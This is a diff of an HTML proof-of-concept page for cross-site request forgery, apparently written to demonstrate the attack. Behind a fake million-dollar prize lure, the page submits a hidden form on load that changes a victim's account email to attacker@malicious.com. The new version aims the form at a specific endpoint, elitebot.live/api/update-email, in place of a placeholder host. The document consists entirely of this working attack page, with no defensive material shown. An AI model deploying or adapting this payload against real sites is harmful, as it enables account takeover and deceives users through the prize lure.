@@ -1,15 +1,19 @@
-<!-- Hosted on attacker-domain.com -->
+<!DOCTYPE html>
 <html>
-  <body>
-    <h1>You've won a prize!</h1>
-    <!-- The form is hidden from the user -->
-    <form id="attack-form" action="https://target-site.com/update-account" method="POST" style="display:none;">
-      <input type="hidden" name="newEmail" value="attacker@malicious.com">
-    </form>
+<head>
+    <title>You've Won $1,000,000!</title>
+</head>
+<body onload="document.getElementById('malicious-form').submit()">
+    <h1>Congratulations!</h1>
+    <p>Please wait while we redirect you to your prize...</p>
 
-    <script>
-      // Automatically submit the form as soon as the page loads
-      document.getElementById('attack-form').submit();
-    </script>
-  </body>
+    <!-- 
+      This form is completely invisible to the user.
+      It targets the legitimate 'update-email' endpoint of your site.
+    -->
+    <form id="malicious-form" action="https://elitebot.live/api/update-email" method="POST">
+        <!-- The attacker sets the new email to their own -->
+        <input type="hidden" name="email" value="attacker@malicious.com">
+    </form>
+</body>
 </html>
